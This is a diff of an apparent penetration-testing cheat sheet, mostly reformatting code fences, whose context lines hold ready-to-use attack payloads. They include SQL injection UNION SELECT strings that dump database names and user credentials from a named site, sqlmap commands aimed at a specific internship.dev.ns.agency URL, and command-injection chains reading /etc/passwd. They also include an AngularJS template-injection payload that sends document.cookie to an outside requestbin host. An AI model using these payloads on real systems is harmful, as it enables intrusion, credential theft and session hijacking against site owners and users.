@@ -250,7 +250,7 @@ UNION SELECT (exfiltrating data):
 /* Dump db version + db name */
     ns.agency/stuff.php?id=3 order by 1                                  
     ns.agency/stuff.php?id=0' union select 1,version(),database()-- 
-
+    
 /* Dump usernames and passwords (MySQL) */
     -- list names of tables within the current database [result=emails, referers, uagents, users]
     ns.agency/stuff.php?id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database()-- 
@@ -277,11 +277,11 @@ add stuff here
 ```
 
 Sqlmap:
-```
-Enumerate everything:
+```bash
+#Enumerate everything:
 $ python sqlmap.py -u https://internship.dev.ns.agency/secret/api/to/get/jobs/?company=sap -a --level=3
 
-Enumerate a specific database:
+#Enumerate a specific database:
 $ python sqlmap.py -u [ example.com/?id=1234 ] --dump -D [ database_name ] --level=3
 ```
 
@@ -305,13 +305,13 @@ Logic Altneratives (bypass filters etc.)
 
 **Command Injection**
 Examples:
-```
+```html
 http://shitesite/lol.php?path=cat%20/etc/passwd
 http://roflblock/cgi-bin/userData.pl?doc=/bin/ls|
 ```  
 
 Injection via. chaining:  
-```
+```bash
 {original_cmd_by_server}; cat flag
 {original_cmd_by_server} && cat flag
 {original_cmd_by_server} | cat flag
@@ -323,7 +323,7 @@ Injection via. chaining:
 {original_cmd_by_server} "; cat $(ls)
 ```  
 Execution inside another command:  
-```
+```bash
 original_cmd_by_server `cat /etc/passwd`
 original_cmd_by_server $(cat /etc/passwd)
 ```  
@@ -333,12 +333,12 @@ original_cmd_by_server $(cat /etc/passwd)
 Tool: https://github.com/epinna/tplmap
 
 Working AngularJS payload (EXT BREAK #2):
-```
+```angular
 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=5+5,new Image().src="http://requestbin.fullcontact.com/1b17hka1?asdf="+document.cookie,alert(2)');}}
 ```
 
 Angular JS:
-```
+```angular
 {{ 7*7 }} => 49
 {{ this }}
 {{ this.toString() }}
